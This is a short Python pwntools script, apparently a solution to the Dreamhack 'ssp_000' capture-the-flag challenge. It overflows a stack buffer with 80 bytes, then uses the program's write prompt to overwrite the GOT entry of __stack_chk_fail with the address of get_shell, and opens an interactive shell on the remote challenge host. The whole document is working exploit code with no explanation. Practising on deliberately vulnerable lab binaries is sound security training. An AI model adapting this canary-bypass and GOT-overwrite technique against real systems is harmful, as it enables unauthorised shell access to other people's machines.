from pwn import *

r = remote("host8.dreamhack.games", 9106)
e = ELF("/mnt/c/Users/Storm/ctf/ssp_000")

payload = b'A' * 80
r.sendline(payload)

r.sendlineafter('Addr : ',  str(e.got['__stack_chk_fail']))
r.sendlineafter('Value : ', str(e.symbols['get_shell']))

r.interactive()
